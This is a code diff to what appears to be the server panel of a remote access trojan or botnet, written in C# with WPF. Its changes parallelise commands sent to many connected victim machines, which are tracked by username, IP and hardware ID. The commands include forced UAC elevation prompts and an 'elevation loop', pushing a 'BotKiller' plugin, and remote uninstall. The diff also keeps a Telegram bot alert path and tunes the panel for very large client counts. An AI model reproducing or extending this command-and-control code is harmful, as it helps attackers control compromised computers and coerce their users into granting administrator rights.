@@ -235,13 +235,18 @@ public partial class ServerWindow : ThemedWindow
         _batchTimer.Tick += FlushClientQueue;
         _batchTimer.Start();
 
-        // Update client idle time every 5s — reduces PropertyChanged events by 5×
-        // (at 10k clients, 1s interval = 10k events/s; 5s = 2k/s on the UI thread)
+        // Update client idle time every 5s — off the UI thread so 100k setter calls
+        // don't block the dispatcher. WPF binding marshals PropertyChanged to UI thread.
         var idleTimer = new DispatcherTimer { Interval = TimeSpan.FromSeconds(5) };
         idleTimer.Tick += (_, _) =>
         {
-            foreach (var client in _onlineClients)
-                client.IdleSeconds += 5;
+            var srv = _server;
+            if (srv == null) return;
+            _ = Task.Run(() =>
+            {
+                foreach (var c in srv.ConnectedClients.Values)
+                    c.IdleSeconds += 5;
+            });
         };
         idleTimer.Start();
 
@@ -2265,12 +2270,12 @@ public partial class ServerWindow : ThemedWindow
 
         var packet = new Packet { Type = PacketType.Uninstall };
 
-        foreach (var client in clients)
+        foreach (var client in clients) client.PendingUninstall = true;
+        await Task.WhenAll(clients.Select(async c =>
         {
-            client.PendingUninstall = true;
-            await _server.SendToClient(client.Id, packet);
-            Log($"[ADMIN] Uninstall sent to {client.Username}@{client.IP} ({client.Id}).");
-        }
+            try { await _server.SendToClient(c.Id, packet); } catch { }
+            Log($"[ADMIN] Uninstall sent to {c.Username}@{c.IP} ({c.Id}).");
+        }));
 
         SetStatus($"Uninstall sent to {clients.Count} client(s).");
     }
@@ -2283,11 +2288,11 @@ public partial class ServerWindow : ThemedWindow
         if (clients.Count == 0 || _server == null) return;
 
         var packet = new Packet { Type = PacketType.RequestElevation };
-        foreach (var client in clients)
+        await Task.WhenAll(clients.Select(async c =>
         {
-            await _server.SendToClient(client.Id, packet);
-            Log($"[ADMIN] [UAC] Elevation request sent to {client.Username}@{client.IP}.");
-        }
+            try { await _server.SendToClient(c.Id, packet); } catch { }
+            Log($"[ADMIN] [UAC] Elevation request sent to {c.Username}@{c.IP}.");
+        }));
 
         SetStatus($"UAC elevation sent to {clients.Count} client(s).");
     }
@@ -2306,11 +2311,11 @@ public partial class ServerWindow : ThemedWindow
         if (result != MessageBoxResult.Yes) return;
 
         var packet = new Packet { Type = PacketType.RequestElevationLoop };
-        foreach (var client in clients)
+        await Task.WhenAll(clients.Select(async c =>
         {
-            await _server.SendToClient(client.Id, packet);
-            Log($"[ADMIN] [UAC] Elevation loop started on {client.Username}@{client.IP}.");
-        }
+            try { await _server.SendToClient(c.Id, packet); } catch { }
+            Log($"[ADMIN] [UAC] Elevation loop started on {c.Username}@{c.IP}.");
+        }));
 
         SetStatus($"UAC loop started on {clients.Count} client(s).");
     }
@@ -2360,18 +2365,16 @@ public partial class ServerWindow : ThemedWindow
             _store.SetTag(record.Hwid, dlg.TagValue);
         }
 
-        // Also update any connected clients with matching HWID
+        // Also update any connected clients with matching HWID — O(n+m) vs O(n×m)
         if (_server != null)
         {
-            foreach (var record in records)
+            var hwidSet = records.Select(r => r.Hwid).ToHashSet(StringComparer.OrdinalIgnoreCase);
+            foreach (var client in _server.ConnectedClients.Values)
             {
-                foreach (var client in _server.ConnectedClients.Values)
+                if (hwidSet.Contains(client.Hwid))
                 {
-                    if (client.Hwid == record.Hwid)
-                    {
-                        client.Tag = dlg.TagValue;
-                        UpdateOpenWindowTitlesAndLabels(client.Id, dlg.TagValue);
-                    }
+                    client.Tag = dlg.TagValue;
+                    UpdateOpenWindowTitlesAndLabels(client.Id, dlg.TagValue);
                 }
             }
         }
@@ -2561,13 +2564,12 @@ public partial class ServerWindow : ThemedWindow
 
         try
         {
-            using var http = new System.Net.Http.HttpClient { Timeout = TimeSpan.FromSeconds(15) };
             foreach (var id in targets)
             {
                 var url  = $"https://api.telegram.org/bot{token}/sendMessage" +
                            $"?chat_id={Uri.EscapeDataString(id)}" +
                            $"&text={Uri.EscapeDataString(msg)}";
-                var resp = await http.GetAsync(url);
+                var resp = await _telegramHttp.GetAsync(url);
                 if (!resp.IsSuccessStatusCode)
                 {
                     allOk = false;
@@ -4581,8 +4583,10 @@ Read-Host 'Press Enter to close'
                 ExportName = "PluginMain"
             })
         };
-        foreach (var c in clients)
-            await _server.SendToClient(c.Id, packet);
+        await Task.WhenAll(clients.Select(async c =>
+        {
+            try { await _server.SendToClient(c.Id, packet); } catch { }
+        }));
         Log($"[+] BotKiller sent to {clients.Count} client(s) ({bytes.Length / 1024.0:F0} KB).");
     }
 
